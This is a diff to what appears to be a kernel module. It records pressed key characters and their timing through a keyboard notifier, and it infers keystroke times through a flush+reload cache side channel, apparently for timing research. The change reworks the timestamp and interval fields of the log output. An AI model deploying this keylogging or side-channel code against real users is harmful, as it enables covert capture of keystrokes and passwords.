@@ -65,8 +65,9 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
     u64 t1 = fenced_rdtsc();
     if (param->down) {
       printk(KERN_INFO "{\"type\": \"press\", \"key-char\": \"%c\", "
-                       "\'keystroke-time\': %llu}",
-             param->value - 64353 + 'a', ((t1 - start_time)/CPU_CLOCK)*10*REPLAY_SPD);
+                       "\'keystroke-time\': %llu, \'interval\': %llu}",
+             param->value - 64353 + 'a', (t1/CPU_CLOCK/10000000)*10*REPLAY_SPD, ((t1 - last_press)/CPU_CLOCK)*10*REPLAY_SPD);
+      //fix the params here
       last_press = t1;
     } else {
       printk(KERN_INFO "{\'type\': \'release\', \'key-char\': \"%c\", "
@@ -86,7 +87,7 @@ static int keystroke_timing(void *data) {
     u64 time = flush_reload_t((void *)(FUNCTION_ADDRESS));
     if (time < threshold) {
       u64 current_time_ns = fenced_rdtsc();
-      printk(KERN_INFO "{\'last-hit\': %llu, \'keystroke-time\': %llu}",
+      printk(KERN_INFO "{\'interval\': %llu, \'keystroke-time\': %llu}",
              ((current_time_ns - last_hit_time - time) / CPU_CLOCK)*10*REPLAY_SPD ,
              ((current_time_ns - start_time -
                  time) / CPU_CLOCK)*10*REPLAY_SPD); // subtract flush+reload time to make it a little more
